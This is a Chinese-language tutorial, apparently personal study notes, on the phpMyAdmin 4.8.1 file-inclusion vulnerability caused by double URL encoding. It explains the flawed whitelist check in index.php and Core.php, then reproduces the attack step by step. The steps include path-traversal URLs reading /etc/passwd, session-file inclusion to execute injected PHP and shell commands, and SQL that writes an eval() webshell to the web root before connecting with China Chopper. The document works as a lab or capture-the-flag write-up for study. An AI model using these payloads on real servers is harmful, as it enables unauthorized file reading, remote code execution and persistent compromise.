
## 一.phpMyAdmin

phpMyAdmin是一种MySQL数据库的管理工具，安装该工具后，即可通过Web形式直接管理MySQL数据，而不需要通过执行系统命令来管理，非常适合对数据库操作命令不熟悉的数据库管理者。![[Pasted image 20251017102719.png]]
## 二.phpMyAdmin基础用法

**第一步，创建数据库。**![[Pasted image 20251017102737.png]]
**第二步，创建数据表 student，点击执行。**![[Pasted image 20251017102833.png]]
**第三步，设置表的字段，包括：id、username、password。**![[Pasted image 20251017102842.png]]

**第四步，查看我们创建好的数据表student。**![[Pasted image 20251017102851.png]]
**第五步，插入数据并查询。**
```sql
INSERT INTO `student`(`id`, `username`, `password`) VALUES ('1', 'yangxiuzhang','6666666');
INSERT INTO `student`(`id`, `username`, `password`) VALUES ('2', 'Eastmountain','123456');

```
![[Pasted image 20251017102910.png]]

## 三.漏洞原理

在phpMyAdmin 4.8.1版本的index.php文件中，第50-63行代码如下
```php
$target_blacklist = array (
    'import.php', 'export.php'
);

// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}

```

它的含义是：

target传入不能为空
target必须是一个字符串
target不能以index开头
target不能在数组target_blacklist中
target经过checkPageValidit检查后为真
前面三个大家都容易理解，第四个判断是黑名单判断。在index.php中已经定义好了target_blacklist的值，它们是import.php和export.php，只要不等于这两个值就可以。

再看第五个判断，Core::checkPageValidity($_REQUEST[‘target’]为真，通过全局搜索发现了checkPageValidity()的代码在libraries\classes\Core.php文件的第443-476行。


```php
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }

    if (in_array($page, $whitelist)) {
        return true;
    }

    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    return false;
}
****
```

在checkPageValidit中有两个形参，第一个是传入的target，第二个whitelist则有默认形参，也就是空的数组。进入函数首先会判断whitelist是否为空，如果为空则将定义的goto_whitelist赋值给whitelist（因为确实为空，我们只传进去一个target）。接着我们来看看goto_whitelist的代码。

```php
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
);

```

接着分析代码，如果page在白名单中就会直接return true，但这里考虑到了可能带参数的情况，所以有了下面的判断。

下图的代码中，mb_strpos函数是查找string在另一个string中首次出现的位置。$_page变量是获取$page问号前的内容，是考虑到target有参数的情况，只要$_page在白名单中就直接return true。但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码。


![[Pasted image 20251017103010.png]]
当传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件。

例如：传入“?target=db_datadict.php%253f ”，由于服务器会自动解码一次，所以在checkPageValidity()中，page的值一开始会是“db_datadict.php%3f”，又一次url解码后变成了“db_datadict.php?”，这时符合了?前内容在白名单的要求，函数返回true。

但在index.php中_REQUEST[‘target’]仍然是“db_datadict.php%3f”，而且会被include，通过目录穿越，就可造成任意文件包含。最终通过该漏洞实现了上述攻击，这个漏洞也很快被修复并发布新版本。
（问号(?)分隔URL和查询 ）

四.phpMyAdmin漏洞复现
漏洞原因：phpMyadmin 4.8.1版本的index.php中存在文件包含漏洞，通过 二次url编码 即可绕过过滤。

第一步，根据该版本CVE漏洞构造URL，在index.php后添加内容，如显示/etc/passwd详细内容。
```
/* 方法一 */
http://localhost:8088/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

/* 方法二 */
http://localhost:8088/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini

```
**第二步，通过目录穿越包含任意文件。**
![[Pasted image 20251017103032.png]]**第三步，执行SQL语句查询数据库路径。结果为：C:\xampp\mysql\data\。**
```sql
show global variables like "%datadir%";
或
select @@datadir;


```

![[Pasted image 20251017103052.png]]

**第四步，向数据库写入php代码。创建数据库rce、表rce和字段code，并插入php代码。**
```sql
CREATE DATABASE rce;
use rce;
CREATE TABLE rce(code varchar(100));
INSERT INTO rce(code) VALUES("<?php phpinfo(); ?>");

```


输出结果如下图所示：![[Pasted image 20251017103114.png]]

然后我们可以看到插入的php代码，如下所示。![[Pasted image 20251017103121.png]]

**第五步，在SQL中执行select ‘<?php phpinfo() ?>’，然后查看当前页面cookie中的phpmyadmin的值。**  
![[Pasted image 20251017103135.png]]
然后通过浏览器的开发者里面查看网络的Cookie值。
![[Pasted image 20251017103142.png]]
**第六步，构建包含Session值的URL路径，包含session文件。**  
F12查看网站Session值，访问/index.php?target=db_sql.php%253f/…/…/…/…/…/…/tmp/sess_[session]。
```
?target=db_datadict.php%253f/../../../../../../../../../phpStudy/PHPTutorial/tmp/tmp/sess_imnnv91q886sfboa2sqos02b7njvho24

```
访问能显示如下图所示的信息：![[Pasted image 20251017103207.png]]
可以看到顺利执行了phpinfo()。
由于我们刚才第五步，在SQL中执行select ‘<?php phpinfo() ?>’，所以select '<?php phpinfo() ?>'会出现在phpmyadmin对应的session文件里，再一包含就会执行<?php phpinfo() ?>，从而泄露php信息（如web目录）
![[Pasted image 20251017103218.png]]
构造执行命令的语句。
```
select '<?php echo `ls` ?>';    //注意是反引号执行命令

```
![[Pasted image 20251017103235.png]]
返回命令执行的结果![[Pasted image 20251017103243.png]]**第七步，在phpinfo默认页面找到网站的安装位置：/var/www/html，然后写入一句话木马。**
```
select '<?php @eval($_POST[hcl]) ?>' into outfile '/var/www/html/hcl.php'

```
第八步，通过菜刀连接 http://ip/hcl.php。菜刀连接成功，在根目录下找到了key.txt文件，查看key.txt文件，获得key值。![[Pasted image 20251017103313.png]]
简单总结：
利用phpMyAdmin 4.8.1后台文件包含漏洞，获取登录phpmyadmin系统所产生的sess_sessionID文件，然后通过文件绕过获取相关信息并植入木马，最终获取webshell。通常linux系统中存放路径为/tmp/sess_[当前会话session值]。同时，此漏洞是登陆后才可以使用的，比较鸡肋。一般登陆后直接执行SQL语句生成shell即可，但有时目录权限比较严格，不能在WEB目录内生成，则可以结合本例使用。

tips:如果没做过设置，session文件默认是在/var/lib/php/sessions/目录下，文件名是sess_加上你的session字段。（没有权限）
而一般情况下，phpmyadmin的session文件会设置在/tmp目录下，需要在php.ini里把session.auto_start置为1，把session.save_path目录设置为/tmp。
